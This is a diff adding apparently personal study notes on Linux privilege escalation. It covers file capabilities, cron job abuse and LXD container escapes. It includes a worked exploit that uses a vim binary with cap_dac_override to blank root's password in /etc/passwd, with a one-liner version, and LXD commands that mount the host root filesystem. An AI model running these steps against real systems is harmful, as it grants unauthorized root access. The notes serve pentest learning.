@@ -382,3 +382,162 @@ cat /var/log/syslog
 grep -i "password" /var/log/*
 grep -i "cron" /var/log/*
 
+
+
+
+XI) Section XII: Capabilities
+=> Security features in linux OS that allows specific processes to be granted some privileges,
+allowing them to do some task otherwise would be restricted.
+
+In ubuntu this command is setcap
+	- eg: sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
+=> the binary file will be able to bind to network port; which is usually restricted
+
+
+Some capabilities:
+
+Capability	Description
+cap_sys_admin	Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.
+cap_sys_chroot	Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.
+cap_sys_ptrace	Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.
+cap_sys_nice	Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.
+cap_sys_time	Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.
+cap_sys_resource	Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.
+cap_sys_module	Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.
+cap_net_bind_service	Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.
+	
+
+
+
+Here are some examples of values that we can use with the setcap command, along with a brief description of what they do:
+
+Capability Values	Description
+=	This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.
++ep	This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.
++ei	This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.
++p	This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.
+
+
+
+
+Several Linux capabilities can be used to escalate a user's privileges to root, including:
+
+Capability	Description
+cap_setuid	Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user.
+cap_setgid	Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group.
+cap_sys_admin	This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems.
+cap_dac_override	Allows bypassing of file read, write, and execute permission checks.
+
+
+
+
+
+Capabilities enumeration:
+	=> find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+
+Exploitation
+
+
+If a binary (like vim) has the cap_dac_override capability, it can bypass file permissions.
+This means even a low-privilege user can read/write protected files like /etc/passwd.
+
+👉 In this case:
+
+vim is allowed to ignore permissions
+So you can edit /etc/passwd
+Remove the password for root
+Then log in as root without a password
+
+👉 Simple idea:
+cap_dac_override → ignore permissions → modify system files → become root
+
+💻 Code (step-by-step)
+	# 1. Find binaries with dangerous capability
+getcap /usr/bin/vim.basic
+	# Output
+/usr/bin/vim.basic cap_dac_override=eip
+
+	# 2. Check root entry
+cat /etc/passwd | head -n1
+	# Output
+root:x:0:0:root:/root:/bin/bash
+
+	# 3. Edit passwd using vim (bypass permissions)
+/usr/bin/vim.basic /etc/passwd
+	
+👉 Change:
+
+root:x:0:0:root:/root:/bin/bash
+
+👉 To:
+
+root::0:0:root:/root:/bin/bash
+	
+	# OR non-interactive exploit
+echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+
+	# 4. Verify change
+cat /etc/passwd | head -n1
+
+	# Output
+root::0:0:root:/root:/bin/bash
+	# 5. Become root (no password needed)
+su root
+🎯 Key takeaway
+
+cap_dac_override = bypass file permissions → edit sensitive files → root access
+
+
+
+
+XII) Section XII: Vulnerable services => check version of services and if there is available
+poc that could potentially lead to privileges escalation
+
+
+XIII) Section XIII: Cron Job Abuse
+ 	=> cron file created is in: /var/spool/cron
+
+	=> pspy => cli tools that allow us to view running processes without being root
+	=> eg: ./pspy64 -pf - i 1000 (-pf tells to print commands and file system events and -i 1000 every 1000ms)
+
+	=> bash one liner reverse-shell : https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+
+XIV) Section XIV: Containers
+	=> operate at the virtual machine 
+	=> Use to isolate a process from the rest of the system
+	=> different from classic virtualization which allows multiple OS to run on the same system
+
+
+	A) Linux container
+- LXC is an operating system level virtualization technique that allows multiple
+linux systems to run in isolation from each other on a single host
+
+
+	B) Linux Daemon
+- Similar to LXC but is designed to contain a complete operating system
+- Before we could exploit this we must confirm that we either belong to group lxc or lxd
+
+
+POC :
+	- Once we confirm we belong to lxc or lxd group
+	- We can create our own containr and transfer it to the target system or use an existing  contianer
+
+Code:
+	- lxc image import <filename.tar.gz> --alias ubuntutemp	
+	- lxc image list
+
+After image is successfully imported
+	- lxc init ubuntutemp privesc -c security.privileged=true
+
+	- lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+
+Done; we can now access the container and log on it
+	- lxc start privesc
+	- lxc exec privesc /bin/bash
+
+
+
+
+
+
